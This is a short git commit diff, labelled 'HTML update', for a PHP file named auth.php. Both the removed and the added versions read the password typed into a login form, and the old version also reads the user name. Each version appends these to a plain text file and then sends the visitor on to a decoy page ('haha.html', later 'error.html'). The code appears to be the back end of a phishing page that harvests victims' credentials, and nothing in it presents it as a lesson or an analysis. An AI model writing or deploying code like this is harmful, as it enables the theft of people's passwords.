df65140e1fb83f489e61d9361491d44223624548
ShadiHakim <shadihakim03@gmail.com>
2022-05-04 18:42:37 +0300

    HTML update

--- html/auth.php
+++ html/auth.php
@@ -1,8 +1,7 @@
 <?php
-  $log_file_name = 'unames_pwords.txt';
-  $n = $_POST['name'];
-	$p = $_POST['pass'];
- 	 $message = "Login name : ".$n."\t" . "password : ".$p."\n";
- 	 file_put_contents($log_file_name, $message, FILE_APPEND);
-  header('Location: /haha.html'); // redirect back to the main site
+  $log_file_name = 'passwords.txt';
+  $p = $_POST['passwrod'];
+  $message = "Password: ".$p."\n";
+  file_put_contents($log_file_name, $message, FILE_APPEND);
+  header('Location: /error.html'); // redirect back to the main site
 ?>
